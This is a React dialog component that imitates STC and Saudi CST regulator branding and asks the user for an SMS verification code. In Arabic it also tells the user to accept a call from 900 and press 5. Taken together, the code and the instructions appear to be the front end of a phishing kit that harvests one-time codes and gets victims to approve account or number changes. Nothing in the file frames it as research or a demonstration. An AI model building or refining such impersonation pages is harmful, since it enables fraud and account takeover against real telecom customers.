"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Dialog, DialogContent } from "@/components/ui/dialog"

interface VerificationPageProps {
  verifyOtp: (code: string) => void
  open: boolean
  onOpenChange: (open: boolean) => void
}

export default function VerificationPage({ verifyOtp, open, onOpenChange }: VerificationPageProps) {
  const [verificationCode, setVerificationCode] = useState("")
  const [countdown, setCountdown] = useState(142) // 02:22 in seconds

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const handleVerify = () => {
    if (verificationCode.length >= 4) {
      verifyOtp(verificationCode)
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg bg-white rounded-3xl p-8 border-0">
        {/* Header */}
        <div className="flex justify-end mb-8">
          <div className="flex items-center gap-2">
            <div className="text-right">
              <div className="text-lg font-bold text-[#1e3a5f]" style={{ fontFamily: "sans-serif" }}>
                منصـــــل
              </div>
              <div className="text-xs font-medium text-[#1e3a5f]" style={{ fontFamily: "sans-serif" }}>
                mutasil
              </div>
            </div>
            <div className="flex flex-col gap-[3px]">
              <div className="flex gap-[3px]">
                <div className="w-[14px] h-[3px] bg-[#6b4c9a] rounded-full"></div>
                <div className="w-[3px] h-[3px] bg-[#4a90e2] rounded-full"></div>
              </div>
              <div className="flex gap-[3px]">
                <div className="w-[14px] h-[3px] bg-[#6b4c9a] rounded-full"></div>
                <div className="w-[3px] h-[3px] bg-[#3dc8de] rounded-full"></div>
              </div>
              <div className="flex gap-[3px]">
                <div className="w-[14px] h-[3px] bg-[#6b4c9a] rounded-full"></div>
                <div className="w-[3px] h-[3px] bg-[#4a90e2] rounded-full"></div>
              </div>
            </div>
          </div>
        </div>

        {/* Top Message */}
        <div className="flex items-start justify-between gap-4 mb-8" dir="rtl">
          <div className="flex-1 text-right">
            <p className="text-base text-[#1e3a5f] leading-relaxed" style={{ fontFamily: "sans-serif" }}>
              تم إرسال رمز التحقق إلى هاتفك
            </p>
            <p className="text-base text-[#1e3a5f] leading-relaxed" style={{ fontFamily: "sans-serif" }}>
              النقال. الرجاء إدخاله في هذه الخانة.
            </p>
          </div>
          <div className="flex-shrink-0">
            <div className="w-12 h-12 rounded-xl bg-[#1e3a5f] flex items-center justify-center">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="6" y="3" width="12" height="18" rx="2" stroke="white" strokeWidth="1.5" fill="none" />
                <path d="M9 7h6M9 10h6M9 13h4" stroke="white" strokeWidth="1.5" strokeLinecap="round" />
                <circle cx="18" cy="7" r="3" fill="#4a90e2" stroke="white" strokeWidth="1" />
              </svg>
            </div>
          </div>
        </div>

        {/* STC Brand */}
        <div className="mb-8 text-right" dir="rtl">
          <div className="mb-3">
            <span
              className="text-[#6b4c9a] font-black text-5xl"
              style={{ fontFamily: "sans-serif", letterSpacing: "-0.02em" }}
            >
              stc
            </span>
          </div>
          <p className="text-[#6b4c9a] text-base font-medium leading-relaxed" style={{ fontFamily: "sans-serif" }}>
            عميلنا الكرام في حال تلقي مكالمة من 900
          </p>
          <p className="text-[#6b4c9a] text-base font-medium leading-relaxed" style={{ fontFamily: "sans-serif" }}>
            الرجاء قبولها واختيار الرقم 5
          </p>
        </div>

        {/* Verification Input */}
        <div className="mb-6" dir="rtl">
          <Input
            type="text"
            placeholder="رمز التحقق"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
            className="w-full h-16 text-right text-lg border-2 border-[#e5e5e7] rounded-xl px-4 placeholder:text-[#999] focus:border-[#6b4c9a] focus:ring-0"
            style={{ fontFamily: "sans-serif" }}
          />
        </div>

        {/* Verify Button and Countdown */}
        <div className="flex items-center justify-between gap-4 mb-12" dir="rtl">
          <div className="text-right">
            <span className="text-[#666] text-base" style={{ fontFamily: "sans-serif" }}>
              إعادة إرسال: {formatTime(countdown)}
            </span>
          </div>
          <Button
            onClick={handleVerify}
            disabled={verificationCode.length < 4}
            className="h-14 px-12 bg-[#6b4c9a] hover:bg-[#5a3d82] disabled:bg-[#e5e5e7] text-white disabled:text-[#999] text-lg font-medium rounded-full transition-colors"
            style={{ fontFamily: "sans-serif" }}
          >
            تحقق
          </Button>
        </div>

        {/* CST Footer */}
        <div className="flex items-center gap-4 pt-8 border-t border-[#f0f0f0]">
          <div className="flex-shrink-0">
            <div className="relative w-16 h-16">
              <svg viewBox="0 0 100 100" className="w-full h-full">
                <circle cx="50" cy="50" r="45" fill="none" stroke="#4a90e2" strokeWidth="2" />
                <circle cx="50" cy="50" r="35" fill="none" stroke="#6b4c9a" strokeWidth="2" />
                <circle cx="50" cy="50" r="25" fill="none" stroke="#3dc8de" strokeWidth="2" />
                <text
                  x="50"
                  y="55"
                  textAnchor="middle"
                  fill="#1e3a5f"
                  fontSize="20"
                  fontWeight="bold"
                  fontFamily="sans-serif"
                >
                  CST
                </text>
              </svg>
            </div>
          </div>
          <div className="flex-1">
            <p className="text-sm text-[#1e3a5f] font-medium mb-1" style={{ fontFamily: "sans-serif" }}>
              هيئة الاتصالات والفضاء والتقنية
            </p>
            <p className="text-sm text-[#666]" style={{ fontFamily: "sans-serif" }}>
              Communications, Space &
            </p>
            <p className="text-sm text-[#666]" style={{ fontFamily: "sans-serif" }}>
              Technology Commission
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
